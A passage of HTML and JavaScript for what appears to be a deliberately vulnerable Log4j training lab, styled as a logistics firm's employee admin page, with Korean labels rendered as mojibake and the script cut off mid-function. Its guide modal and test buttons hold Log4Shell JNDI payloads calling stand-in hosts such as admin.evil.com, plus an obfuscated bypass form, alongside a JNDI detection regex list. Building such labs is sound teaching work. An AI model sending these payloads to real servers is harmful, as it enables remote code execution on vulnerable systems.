<li class="nav-item">
    <a class="nav-link" href="/shipping">
        <i class="fas fa-shipping-fast me-1"></i>ì¶œê³ ê´€ë¦¬
    </a>
</li>
<li class="nav-item">
    <a class="nav-link" href="/inventory">
        <i class="fas fa-boxes me-1"></i>ì¬ê³ ì¡°íšŒ
    </a>
</li>
<li class="nav-item">
    <a class="nav-link" href="/tracking">
        <i class="fas fa-route me-1"></i>ë°°ì†¡ì¶”ì 
    </a>
</li>
</ul>
<ul class="navbar-nav">
<li class="nav-item dropdown">
    <a class="nav-link dropdown-toggle active" href="#" role="button" data-bs-toggle="dropdown">
        <i class="fas fa-cog me-1"></i>ì‹œìŠ¤í…œê´€ë¦¬
    </a>
    <ul class="dropdown-menu">
        <li><a class="dropdown-item active" href="/admin/users">ì§ì›ê´€ë¦¬</a></li>
        <li><a class="dropdown-item" href="/admin/logs">ì‹œìŠ¤í…œë¡œê·¸</a></li>
        <li><hr class="dropdown-divider"></li>
        <li><a class="dropdown-item text-warning" href="/vulnerable">
            <i class="fas fa-bug me-1"></i>ì·¨ì•½ì  ì‹¤ìŠµ
        </a></li>
    </ul>
</li>
</ul>
</div>
</div>
</nav>

<!-- Admin Header -->
<section class="admin-header">
<div class="container">
<div class="row align-items-center">
<div class="col-md-8">
<h1 class="display-5 fw-bold">
    <i class="fas fa-users-cog me-3"></i>ì§ì› ê´€ë¦¬ ì‹œìŠ¤í…œ
</h1>
<p class="lead">ì‚¬ìš©ì ê³„ì • ê´€ë¦¬ ë° ê¶Œí•œ ì„¤ì •</p>
</div>
<div class="col-md-4 text-end">
<button class="btn btn-light btn-lg" onclick="showAddUserModal()">
    <i class="fas fa-user-plus me-2"></i>ì§ì› ì¶”ê°€
</button>
</div>
</div>
</div>
</section>

<div class="container">
<!-- Vulnerability Warning -->
<div class="vulnerability-warning">
<div class="row align-items-center">
<div class="col-md-8">
<h5 class="mb-1">
    <i class="fas fa-shield-alt me-2"></i>
    ê´€ë¦¬ì í˜ì´ì§€ ë³´ì•ˆ ì‹¤ìŠµ
</h5>
<p class="mb-0">ì§ì› ê²€ìƒ‰, ë“±ë¡, ìˆ˜ì • ê³¼ì •ì—ì„œ Log4j ì·¨ì•½ì  ì‹¤ìŠµ</p>
<small>ğŸ¯ ì‚¬ìš©ì ì •ë³´ ì…ë ¥ ì‹œ JNDI íŒ¨í„´ì„ í…ŒìŠ¤íŠ¸</small>
</div>
<div class="col-md-4 text-end">
<button class="btn btn-outline-light" onclick="showSecurityGuide()">
    <i class="fas fa-info-circle me-1"></i>ë³´ì•ˆ ê°€ì´ë“œ
</button>
</div>
</div>
</div>

<!-- Statistics -->
<div class="row mb-4">
<div class="col-md-3">
<div class="stats-card">
<i class="fas fa-users stats-icon text-primary"></i>
<h3 class="fw-bold">247</h3>
<p class="text-muted">ì´ ì§ì› ìˆ˜</p>
</div>
</div>
<div class="col-md-3">
<div class="stats-card">
<i class="fas fa-user-check stats-icon text-success"></i>
<h3 class="fw-bold">198</h3>
<p class="text-muted">í™œì„± ê³„ì •</p>
</div>
</div>
<div class="col-md-3">
<div class="stats-card">
<i class="fas fa-user-slash stats-icon text-warning"></i>
<h3 class="fw-bold">35</h3>
<p class="text-muted">ë¹„í™œì„± ê³„ì •</p>
</div>
</div>
<div class="col-md-3">
<div class="stats-card">
<i class="fas fa-exclamation-triangle stats-icon text-danger"></i>
<h3 class="fw-bold">14</h3>
<p class="text-muted">ì •ì§€ëœ ê³„ì •</p>
</div>
</div>
</div>

<div class="row">
<!-- Main Content -->
<div class="col-lg-8">
<!-- Search Section -->
<div class="search-container">
<div class="row align-items-end">
    <div class="col-md-6">
        <label class="form-label fw-bold">
            <i class="fas fa-search me-2"></i>ì§ì› ê²€ìƒ‰
        </label>
        <input type="text" class="form-control search-input" id="userSearchInput" 
            placeholder="ì´ë¦„, ì´ë©”ì¼, ì‚¬ìš©ìëª…ìœ¼ë¡œ ê²€ìƒ‰...">
        <div class="form-text text-warning">
            âš ï¸ Log4j ì·¨ì•½ì  ì‹¤ìŠµ: ê²€ìƒ‰ì–´ì— JNDI íŒ¨í„´ì„ ì…ë ¥í•´ë³´ì„¸ìš”
        </div>
    </div>
    <div class="col-md-3">
        <label class="form-label fw-bold">ì—­í• </label>
        <select class="form-select" id="roleFilter">
            <option value="">ëª¨ë“  ì—­í• </option>
            <option value="admin">ê´€ë¦¬ì</option>
            <option value="manager">ë§¤ë‹ˆì €</option>
            <option value="user">ì¼ë°˜ ì‚¬ìš©ì</option>
        </select>
    </div>
    <div class="col-md-3">
        <button class="btn btn-primary w-100" onclick="performUserSearch()">
            <i class="fas fa-search me-2"></i>ê²€ìƒ‰
        </button>
    </div>
</div>

<!-- Quick Search Buttons -->
<div class="mt-3">
    <div class="d-flex flex-wrap gap-2">
        <button class="btn btn-outline-secondary btn-sm" onclick="quickUserSearch('ê´€ë¦¬ì')">
            <i class="fas fa-user-shield me-1"></i>ê´€ë¦¬ì
        </button>
        <button class="btn btn-outline-secondary btn-sm" onclick="quickUserSearch('ì‹ ì…')">
            <i class="fas fa-user-plus me-1"></i>ì‹ ì…
        </button>
        <button class="btn btn-outline-secondary btn-sm" onclick="quickUserSearch('ë¬¼ë¥˜íŒ€')">
            <i class="fas fa-truck me-1"></i>ë¬¼ë¥˜íŒ€
        </button>
        <button class="btn btn-outline-danger btn-sm" onclick="quickUserSearch('${jndi:ldap://admin-test.com/exploit}')">
            <i class="fas fa-bug me-1"></i>ì·¨ì•½ì  í…ŒìŠ¤íŠ¸
        </button>
    </div>
</div>
</div>

<!-- User Table -->
<div class="admin-card">
<div class="admin-card-header">
    <div class="d-flex justify-content-between align-items-center">
        <h5 class="mb-0">
            <i class="fas fa-users me-2"></i>ì§ì› ëª©ë¡
        </h5>
        <div class="btn-group btn-group-sm">
            <button class="btn btn-outline-light" onclick="refreshUserTable()">
                <i class="fas fa-sync-alt me-1"></i>ìƒˆë¡œê³ ì¹¨
            </button>
            <button class="btn btn-outline-light" onclick="exportUsers()">
                <i class="fas fa-download me-1"></i>ë‚´ë³´ë‚´ê¸°
            </button>
        </div>
    </div>
</div>
<div class="admin-card-body">
    <div class="table-responsive">
        <table class="table table-hover" id="usersTable">
            <thead class="table-dark">
                <tr>
                    <th>ì§ì›</th>
                    <th>ì‚¬ìš©ìëª…</th>
                    <th>ì´ë©”ì¼</th>
                    <th>ì—­í• </th>
                    <th>ìƒíƒœ</th>
                    <th>ë§ˆì§€ë§‰ ë¡œê·¸ì¸</th>
                    <th>ì‘ì—…</th>
                </tr>
            </thead>
            <tbody id="usersTableBody">
                <!-- Sample Data -->
                <tr>
                    <td>
                        <div class="d-flex align-items-center">
                            <div class="user-avatar">ê¹€</div>
                            <div>
                                <h6 class="mb-0">ê¹€ë¬¼ë¥˜</h6>
                                <small class="text-muted">ë¬¼ë¥˜íŒ€ íŒ€ì¥</small>
                            </div>
                        </div>
                    </td>
                    <td>kim.logistics</td>
                    <td>kim@securelogistics.com</td>
                    <td><span class="role-badge role-manager">ë§¤ë‹ˆì €</span></td>
                    <td><span class="user-status status-active">í™œì„±</span></td>
                    <td>2025-05-27 14:30</td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <button class="btn btn-outline-primary btn-action" onclick="viewUser('kim.logistics')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-outline-warning btn-action" onclick="editUser('kim.logistics')">
                                <i class="fas fa-edit"></i>
                            </button>
                            <button class="btn btn-outline-danger btn-action" onclick="suspendUser('kim.logistics')">
                                <i class="fas fa-ban"></i>
                            </button>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class="d-flex align-items-center">
                            <div class="user-avatar">ì´</div>
                            <div>
                                <h6 class="mb-0">ì´ì°½ê³ </h6>
                                <small class="text-muted">ì°½ê³  ê´€ë¦¬ì›</small>
                            </div>
                        </div>
                    </td>
                    <td>lee.warehouse</td>
                    <td>lee@securelogistics.com</td>
                    <td><span class="role-badge role-user">ì‚¬ìš©ì</span></td>
                    <td><span class="user-status status-active">í™œì„±</span></td>
                    <td>2025-05-27 13:45</td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <button class="btn btn-outline-primary btn-action" onclick="viewUser('lee.warehouse')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-outline-warning btn-action" onclick="editUser('lee.warehouse')">
                                <i class="fas fa-edit"></i>
                            </button>
                            <button class="btn btn-outline-danger btn-action" onclick="suspendUser('lee.warehouse')">
                                <i class="fas fa-ban"></i>
                            </button>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td>
                        <div class="d-flex align-items-center">
                            <div class="user-avatar">ë°•</div>
                            <div>
                                <h6 class="mb-0">ë°•ê´€ë¦¬</h6>
                                <small class="text-muted">ì‹œìŠ¤í…œ ê´€ë¦¬ì</small>
                            </div>
                        </div>
                    </td>
                    <td>admin</td>
                    <td>admin@securelogistics.com</td>
                    <td><span class="role-badge role-admin">ê´€ë¦¬ì</span></td>
                    <td><span class="user-status status-active">í™œì„±</span></td>
                    <td>2025-05-27 15:20</td>
                    <td>
                        <div class="btn-group btn-group-sm">
                            <button class="btn btn-outline-primary btn-action" onclick="viewUser('admin')">
                                <i class="fas fa-eye"></i>
                            </button>
                            <button class="btn btn-outline-warning btn-action" onclick="editUser('admin')">
                                <i class="fas fa-edit"></i>
                            </button>
                            <button class="btn btn-outline-secondary btn-action" disabled title="ê´€ë¦¬ì ê³„ì •ì€ ì •ì§€í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤">
                                <i class="fas fa-shield-alt"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
</div>
</div>

<!-- Sidebar -->
<div class="col-lg-4">
<!-- Recent Activity -->
<div class="admin-card">
<div class="admin-card-header">
    <h6 class="mb-0">
        <i class="fas fa-clock me-2"></i>ìµœê·¼ í™œë™
    </h6>
</div>
<div class="admin-card-body">
    <div class="activity-feed">
        <div class="activity-item">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <h6 class="mb-1">ìƒˆ ì§ì› ë“±ë¡</h6>
                    <small class="text-muted">ì •ë°°ì†¡ ê³„ì •ì´ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤</small>
                </div>
                <small class="text-muted">5ë¶„ ì „</small>
            </div>
        </div>
        <div class="activity-item warning">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <h6 class="mb-1">ì˜ì‹¬ìŠ¤ëŸ¬ìš´ ë¡œê·¸ì¸</h6>
                    <small class="text-muted">ì´ì°½ê³  ê³„ì •ì— ë¹„ì •ìƒì ì¸ ë¡œê·¸ì¸ ì‹œë„</small>
                </div>
                <small class="text-muted">12ë¶„ ì „</small>
            </div>
        </div>
        <div class="activity-item danger">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <h6 class="mb-1">ë³´ì•ˆ ê²½ê³ </h6>
                    <small class="text-muted">JNDI íŒ¨í„´ì´ ê²€ìƒ‰ì–´ì—ì„œ ê°ì§€ë¨</small>
                </div>
                <small class="text-muted">18ë¶„ ì „</small>
            </div>
        </div>
        <div class="activity-item">
            <div class="d-flex justify-content-between align-items-start">
                <div>
                    <h6 class="mb-1">ê¶Œí•œ ë³€ê²½</h6>
                    <small class="text-muted">ê¹€ë¬¼ë¥˜ ê¶Œí•œì´ ë§¤ë‹ˆì €ë¡œ ìŠ¹ê²©</small>
                </div>
                <small class="text-muted">1ì‹œê°„ ì „</small>
            </div>
        </div>
    </div>
</div>
</div>

<!-- Security Status -->
<div class="admin-card">
<div class="admin-card-header">
    <h6 class="mb-0">
        <i class="fas fa-shield-alt me-2"></i>ë³´ì•ˆ ìƒíƒœ
    </h6>
</div>
<div class="admin-card-body">
    <div class="row text-center">
        <div class="col-6 mb-3">
            <div class="text-success">
                <i class="fas fa-check-circle fa-2x"></i>
                <h5 class="fw-bold mt-2">198</h5>
                <small>ì•ˆì „í•œ ê³„ì •</small>
            </div>
        </div>
        <div class="col-6 mb-3">
            <div class="text-warning">
                <i class="fas fa-exclamation-triangle fa-2x"></i>
                <h5 class="fw-bold mt-2">12</h5>
                <small>ì£¼ì˜ ê³„ì •</small>
            </div>
        </div>
        <div class="col-6">
            <div class="text-danger">
                <i class="fas fa-ban fa-2x"></i>
                <h5 class="fw-bold mt-2">14</h5>
                <small>ì°¨ë‹¨ëœ ê³„ì •</small>
            </div>
        </div>
        <div class="col-6">
            <div class="text-info">
                <i class="fas fa-bug fa-2x"></i>
                <h5 class="fw-bold mt-2">3</h5>
                <small>ì·¨ì•½ì  ê°ì§€</small>
            </div>
        </div>
    </div>
    <button class="btn btn-outline-primary w-100 mt-3" onclick="showSecurityReport()">
        <i class="fas fa-chart-pie me-2"></i>ìƒì„¸ ë³´ê³ ì„œ
    </button>
</div>
</div>

<!-- Quick Actions -->
<div class="admin-card">
<div class="admin-card-header">
    <h6 class="mb-0">
        <i class="fas fa-lightning-bolt me-2"></i>ë¹ ë¥¸ ì‘ì—…
    </h6>
</div>
<div class="admin-card-body">
    <button class="btn btn-primary w-100 mb-2" onclick="showAddUserModal()">
        <i class="fas fa-user-plus me-2"></i>ìƒˆ ì§ì› ë“±ë¡
    </button>
    <button class="btn btn-warning w-100 mb-2" onclick="showBulkActions()">
        <i class="fas fa-users-cog me-2"></i>ì¼ê´„ ì‘ì—…
    </button>
    <button class="btn btn-info w-100 mb-2" onclick="exportUsers()">
        <i class="fas fa-file-export me-2"></i>ë°ì´í„° ë‚´ë³´ë‚´ê¸°
    </button>
    <button class="btn btn-danger w-100" onclick="showVulnerabilityTest()">
        <i class="fas fa-bug me-2"></i>ì·¨ì•½ì  í…ŒìŠ¤íŠ¸
    </button>
</div>
</div>
</div>
</div>
</div>

<!-- Add User Modal -->
<div class="modal fade" id="addUserModal" tabindex="-1">
<div class="modal-dialog modal-lg">
<div class="modal-content">
<div class="modal-header bg-primary text-white">
<h5 class="modal-title">
    <i class="fas fa-user-plus me-2"></i>ìƒˆ ì§ì› ë“±ë¡
</h5>
<button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
</div>
<div class="modal-body">
<form id="addUserForm">
    <div class="row">
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userName" class="form-label">ì´ë¦„</label>
                <input type="text" class="form-control" id="userName" required>
            </div>
        </div>
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userUsername" class="form-label">ì‚¬ìš©ìëª…</label>
                <input type="text" class="form-control" id="userUsername" required>
                <div class="form-text text-warning">âš ï¸ Log4j ì·¨ì•½ì  ì‹¤ìŠµ ëŒ€ìƒ</div>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userEmail" class="form-label">ì´ë©”ì¼</label>
                <input type="email" class="form-control" id="userEmail" required>
            </div>
        </div>
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userRole" class="form-label">ì—­í• </label>
                <select class="form-select" id="userRole" required>
                    <option value="">ì—­í•  ì„ íƒ</option>
                    <option value="user">ì¼ë°˜ ì‚¬ìš©ì</option>
                    <option value="manager">ë§¤ë‹ˆì €</option>
                    <option value="admin">ê´€ë¦¬ì</option>
                </select>
            </div>
        </div>
    </div>
    <div class="row">
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userDepartment" class="form-label">ë¶€ì„œ</label>
                <input type="text" class="form-control" id="userDepartment">
            </div>
        </div>
        <div class="col-md-6">
            <div class="mb-3">
                <label for="userPosition" class="form-label">ì§ì±…</label>
                <input type="text" class="form-control" id="userPosition">
            </div>
        </div>
    </div>
    <div class="mb-3">
        <label for="userNotes" class="form-label">ë¹„ê³ </label>
        <textarea class="form-control" id="userNotes" rows="3" 
                 placeholder="ì¶”ê°€ ì •ë³´ë‚˜ íŠ¹ì´ì‚¬í•­ì„ ì…ë ¥í•˜ì„¸ìš”..."></textarea>
        <div class="form-text text-warning">âš ï¸ ì´ í•„ë“œë„ Log4j ë¡œê¹… ëŒ€ìƒì…ë‹ˆë‹¤</div>
    </div>
    <div class="form-check">
        <input class="form-check-input" type="checkbox" id="userActive" checked>
        <label class="form-check-label" for="userActive">
            ê³„ì • í™œì„±í™”
        </label>
    </div>
</form>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">ì·¨ì†Œ</button>
<button type="button" class="btn btn-primary" onclick="addUser()">
    <i class="fas fa-save me-1"></i>ë“±ë¡
</button>
</div>
</div>
</div>
</div>

<!-- Security Guide Modal -->
<div class="modal fade" id="securityGuideModal" tabindex="-1">
<div class="modal-dialog modal-xl">
<div class="modal-content">
<div class="modal-header bg-warning text-dark">
<h5 class="modal-title">
    <i class="fas fa-shield-alt me-2"></i>ê´€ë¦¬ì í˜ì´ì§€ ë³´ì•ˆ ì‹¤ìŠµ ê°€ì´ë“œ
</h5>
<button type="button" class="btn-close" data-bs-dismiss="modal"></button>
</div>
<div class="modal-body">
<div class="row">
    <div class="col-md-6">
        <h6 class="fw-bold text-primary">ğŸ¯ ì‹¤ìŠµ í¬ì¸íŠ¸</h6>
        <ul>
            <li><strong>ì§ì› ê²€ìƒ‰</strong>: ê²€ìƒ‰ì–´ì— JNDI íŒ¨í„´ ì…ë ¥</li>
            <li><strong>ì§ì› ë“±ë¡</strong>: ì‚¬ìš©ìëª…, ì´ë¦„ í•„ë“œì— ê³µê²© ì½”ë“œ</li>
            <li><strong>ì •ë³´ ìˆ˜ì •</strong>: ë¹„ê³  í•„ë“œë¥¼ í†µí•œ ì·¨ì•½ì  í…ŒìŠ¤íŠ¸</li>
            <li><strong>ê´€ë¦¬ ì‘ì—…</strong>: ê°ì¢… ê´€ë¦¬ ê¸°ëŠ¥ì—ì„œ ë¡œê¹… í™•ì¸</li>
        </ul>

        <h6 class="fw-bold text-success mt-4">ğŸ“‹ ì‹¤ìŠµ ì ˆì°¨</h6>
        <ol>
            <li>ê²€ìƒ‰ì°½ì— JNDI íŒ¨í„´ ì…ë ¥</li>
            <li>ìƒˆ ì§ì› ë“±ë¡ ì‹œ ì·¨ì•½ì  íŒ¨í„´ í…ŒìŠ¤íŠ¸</li>
            <li>ì‹œìŠ¤í…œ ë¡œê·¸ì—ì„œ Log4j ë™ì‘ í™•ì¸</li>
            <li>ë³´ì•ˆ ê²½ê³  ë©”ì‹œì§€ í™•ì¸</li>
        </ol>
    </div>
    <div class="col-md-6">
        <h6 class="fw-bold text-danger">ğŸš¨ í…ŒìŠ¤íŠ¸ íŒ¨í„´</h6>
        <div class="bg-dark text-light p-3 rounded">
            <code>
                # ì‚¬ìš©ìëª… ê³µê²©<br>
                ${jndi:ldap://admin.evil.com/user}<br><br>
                
                # ê²€ìƒ‰ì–´ ê³µê²©<br>
                ${jndi:rmi://search.malicious.com/query}<br><br>
                
                # ë¹„ê³  í•„ë“œ ê³µê²©<br>
                ${jndi:dns://notes.attacker.com/data}<br><br>
                
                # ê´€ë¦¬ ê¸°ëŠ¥ ê³µê²©<br>
                ${${lower:jndi}:${lower:ldap}://admin.bypass.com/mgmt}
            </code>
        </div>

        <div class="alert alert-info mt-3">
            <h6 class="fw-bold">ğŸ’¡ ê´€ì°° í¬ì¸íŠ¸</h6>
            <p class="mb-0">ê° ì…ë ¥ í•„ë“œì—ì„œ JNDI íŒ¨í„´ì„ ì…ë ¥í•  ë•Œë§ˆë‹¤ ì„œë²„ ë¡œê·¸ë¥¼ í™•ì¸í•˜ì—¬ Log4jê°€ ì–´ë–»ê²Œ ì²˜ë¦¬í•˜ëŠ”ì§€ ê´€ì°°í•´ë³´ì„¸ìš”.</p>
        </div>
    </div>
</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-bs-dismiss="modal">ë‹«ê¸°</button>
<button type="button" class="btn btn-warning" onclick="startSecurityTest()">
    <i class="fas fa-play me-1"></i>í…ŒìŠ¤íŠ¸ ì‹œì‘
</button>
</div>
</div>
</div>
</div>

<!-- Bootstrap JS -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<!-- DataTables JS -->
<script src="https://cdn.datatables.net/1.13.4/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.13.4/js/dataTables.bootstrap5.min.js"></script>

<!-- Custom JavaScript -->
<script>
// Initialize DataTable
$(document).ready(function() {
$('#usersTable').DataTable({
"pageLength": 10,
"language": {
"url": "//cdn.datatables.net/plug-ins/1.13.4/i18n/ko.json"
},
"order": [[ 5, "desc" ]]
});

// Real-time input monitoring
setupInputMonitoring();
});

// ğŸš¨ Log4j ì·¨ì•½ì : ì§ì› ê²€ìƒ‰
function performUserSearch() {
const searchTerm = document.getElementById('userSearchInput').value;
const roleFilter = document.getElementById('roleFilter').value;

if (!searchTerm.trim()) {
showAlert('ê²€ìƒ‰ì–´ë¥¼ ì…ë ¥í•´ì£¼ì„¸ìš”.', 'warning');
return;
}

// ğŸš¨ Log4j ì·¨ì•½ì : API í˜¸ì¶œë¡œ ì‚¬ìš©ì ê²€ìƒ‰ ë¡œê¹…
fetch(`/api/users/search?q=${encodeURIComponent(searchTerm)}&role=${roleFilter}`)
.then(response => response.json())
.then(data => {
updateUserTable(data);

// JNDI íŒ¨í„´ ê°ì§€
if (detectJNDIPattern(searchTerm)) {
    showVulnerabilityAlert(searchTerm, 'ì§ì› ê²€ìƒ‰');
}
})
.catch(error => {
console.error('ê²€ìƒ‰ ì˜¤ë¥˜:', error);
showAlert('ê²€ìƒ‰ ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤.', 'danger');

// ëª¨ì˜ ê²°ê³¼ í‘œì‹œ
showMockSearchResults(searchTerm);
});
}

// ë¹ ë¥¸ ê²€ìƒ‰
function quickUserSearch(term) {
document.getElementById('userSearchInput').value = term;
performUserSearch();
}

// ğŸš¨ Log4j ì·¨ì•½ì : ìƒˆ ì§ì› ë“±ë¡
function addUser() {
const userData = {
name: document.getElementById('userName').value,
username: document.getElementById('userUsername').value,
email: document.getElementById('userEmail').value,
role: document.getElementById('userRole').value,
department: document.getElementById('userDepartment').value,
position: document.getElementById('userPosition').value,
notes: document.getElementById('userNotes').value,
active: document.getElementById('userActive').checked
};

// í•„ìˆ˜ í•„ë“œ ê²€ì¦
if (!userData.name || !userData.username || !userData.email || !userData.role) {
showAlert('í•„ìˆ˜ í•„ë“œë¥¼ ëª¨ë‘ ì…ë ¥í•´ì£¼ì„¸ìš”.', 'warning');
return;
}

// ğŸš¨ Log4j ì·¨ì•½ì : API í˜¸ì¶œë¡œ ì‚¬ìš©ì ë“±ë¡ ë¡œê¹…
fetch('/api/users/register', {
method: 'POST',
headers: {
'Content-Type': 'application/json',
},
body: JSON.stringify(userData)
})
.then(response => response.text())
.then(data => {
showAlert('ìƒˆ ì§ì›ì´ ì„±ê³µì ìœ¼ë¡œ ë“±ë¡ë˜ì—ˆìŠµë‹ˆë‹¤.', 'success');
bootstrap.Modal.getInstance(document.getElementById('addUserModal')).hide();
refreshUserTable();

// JNDI íŒ¨í„´ ê°ì§€
const sensitiveFields = [userData.name, userData.username, userData.notes];
sensitiveFields.forEach(field => {
if (field && detectJNDIPattern(field)) {
    showVulnerabilityAlert(field, 'ì§ì› ë“±ë¡');
}
});
})
.catch(error => {
console.error('ë“±ë¡ ì˜¤ë¥˜:', error);
showAlert('ì§ì› ë“±ë¡ ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤.', 'danger');
});
}

// JNDI íŒ¨í„´ ê°ì§€
function detectJNDIPattern(input) {
const jndiPatterns = [
/\$\{jndi:/i,
/ldap:\/\//i,
/rmi:\/\//i,
/dns:\/\//i,
/\$\{.*:.*\}/i
];

return jndiPatterns.some(pattern => pattern.test(input));
}

// ì·¨ì•½ì  ê²½ê³  í‘œì‹œ
function showVulnerabilityAlert(input, context) {
const alertHtml = `
<div class="alert alert-danger alert-dismissible fade show" role="alert">
<div class="row align-items-center">
    <div class="col-md-8">
        <h6 class="fw-bold mb-1">
            <i class="fas fa-exclamation-triangle me-2"></i>
            Log4j ì·¨ì•½ì  íŒ¨í„´ ê°ì§€!
        </h6>
        <p class="mb-1">${context}ì—ì„œ JNDI íŒ¨í„´ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p>
        <small>íŒ¨í„´: <code>${input.substring(0, 80)}${input.length > 80 ? '...' : ''}</code></small>
    </div>
    <div class="col-md-4 text-end">
        <button class="btn btn-outline-danger btn-sm" onclick="showSecurityGuide()">
            <i class="fas fa-info-circle me-1"></i>ìƒì„¸ ì •ë³´
        </button>
    </div>
</div>
<button type="button" class="btn-close" data-bs-dismiss="alert"></button>
</div>
`;

document.querySelector('.container').insertAdjacentHTML('afterbegin', alertHtml);
}

// ì‹¤ì‹œê°„ ì…ë ¥ ëª¨ë‹ˆí„°ë§
function setupInputMonitoring() {
const monitoredInputs = ['userSearchInput', 'userName', 'userUsername', 'userNotes'];

monitoredInputs.forEach(inputId => {
const element = document.getElementById(inputId);
if (element) {
element.addEventListener('input', function(e) {
    const value = e.target.value;
    if (detectJNDIPattern(value)) {
        e.target.style.borderColor = '#dc3545';
        e.target.style.backgroundColor = '#f8d7da';
    } else {
        e.target.style.borderColor = '#ced4da';
        e.target.style.backgroundColor = 'white';
    }
});
}
});
}

// ì‚¬ìš©ì ê´€ë¦¬ í•¨ìˆ˜ë“¤
function viewUser(username) {
showAlert(`ì‚¬ìš©ì ìƒì„¸ ì •ë³´: ${username}`, 'info');
// ì‹¤ì œë¡œëŠ” ìƒì„¸ ëª¨ë‹¬ í‘œì‹œ
}

function editUser(username) {
showAlert(`ì‚¬ìš©ì í¸ì§‘: ${username}`, 'info');
// ì‹¤ì œë¡œëŠ” í¸ì§‘ ëª¨ë‹¬ í‘œì‹œ
}

function suspendUser(username) {
if (confirm(`ì •ë§ë¡œ ${username} ê³„ì •ì„ ì •ì§€í•˜ì‹œê² ìŠµë‹ˆê¹Œ?`)) {
// ğŸš¨ Log4j ì·¨ì•½ì : ì‚¬ìš©ì ì •ì§€ ë¡œê¹…
fetch(`/api/users/${username}/suspend`, {
method: 'POST',
headers: {
    'Content-Type': 'application/json',
}
})
.then(response => response.text())
.then(data => {
showAlert(`${username} ê³„ì •ì´ ì •ì§€ë˜ì—ˆìŠµë‹ˆë‹¤.`, 'warning');
refreshUserTable();
})
.catch(error => {
showAlert('ê³„ì • ì •ì§€ ì¤‘ ì˜¤ë¥˜ê°€ ë°œìƒí–ˆìŠµë‹ˆë‹¤.', 'danger');
});
}
}

// ëª¨ë‹¬ ë° ê¸°íƒ€ í•¨ìˆ˜ë“¤
function showAddUserModal() {
new bootstrap.Modal(document.getElementById('addUserModal')).show();
}

function showSecurityGuide() {
new bootstrap.Modal(document.getElementById('securityGuideModal')).show();
}

function refreshUserTable() {
$('#usersTable').DataTable().ajax.reload();
showAlert('ì§ì› ëª©ë¡ì´ ìƒˆë¡œê³ ì¹¨ë˜ì—ˆìŠµë‹ˆë‹¤.', 'info');
}

function exportUsers() {
showAlert('ì§ì› ë°ì´í„°ë¥¼ ë‚´ë³´ë‚´ëŠ” ì¤‘...', 'info');
// ì‹¤ì œë¡œëŠ” Excel/CSV ë‹¤ìš´ë¡œë“œ
}

function showBulkActions() {
showAlert('ì¼ê´„ ì‘ì—… ê¸°ëŠ¥ì€ ê°œë°œ ì¤‘ì…ë‹ˆë‹¤.', 'info');
}

function showVulnerabilityTest() {
if (confirm('ì·¨ì•½ì  í…ŒìŠ¤íŠ¸ë¥¼ ì‹œì‘í•˜ì‹œê² ìŠµë‹ˆê¹Œ? ì´ëŠ” êµìœ¡ ëª©ì ìœ¼ë¡œë§Œ ì‚¬ìš©ë©ë‹ˆë‹¤.')) {
// ìë™ìœ¼ë¡œ ì·¨ì•½ì  íŒ¨í„´ ì…ë ¥
document.getElementById('userSearchInput').value = '${jndi:ldap://vuln-test.com/admin}';
performUserSearch();
}
}

function showSecurityReport() {
showAlert('ìƒì„¸ ë³´ì•ˆ ë³´ê³ ì„œëŠ” ë³„ë„ í˜ì´ì§€ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.', 'info');
}

function startSecurityTest() {
bootstrap.Modal.getInstance(document.getElementById('securityGuideModal')).hide();

// ë‹¨ê³„ë³„ í…ŒìŠ¤íŠ¸ ì‹œì‘
setTimeout(() => {
showAlert('ë³´ì•ˆ í…ŒìŠ¤íŠ¸ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤. ì²« ë²ˆì§¸ í…ŒìŠ¤íŠ¸ íŒ¨í„´ì„ ì…ë ¥í•©ë‹ˆë‹¤.', 'warning');
document.getElementById('userSearchInput').value = '${jndi:ldap://security-test.com/step1}';
performUserSearch();
}, 1000);
}

// ê²€ìƒ‰ ê²°ê³¼ ì—…ë°ì´íŠ¸
function updateUserTable(data) {
if (data && data.content) {
console.log('ê²€ìƒ‰ ê²°ê³¼:', data);
showAlert(`ê²€ìƒ‰ ì™„ë£Œ: ${data.totalElements || 0}ëª…ì˜ ì§ì›ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤.`, 'success');
} else {
showMockSearchResults('ê²€ìƒ‰ì–´');
}
}

function showMockSearchResults(searchTerm) {
showAlert(`"${searchTerm}" ê²€ìƒ‰ ì™„ë£Œ - 3ëª…ì˜ ì§ì›ì„ ì°¾ì•˜ìŠµë‹ˆë‹¤.`, 'success');

// ì·¨ì•½ì  íŒ¨í„´ì¸ ê²½ìš° ì¶”ê°€ ë©”ì‹œì§€
if (detectJNDIPattern(searchTerm)) {
setTimeout(() => {
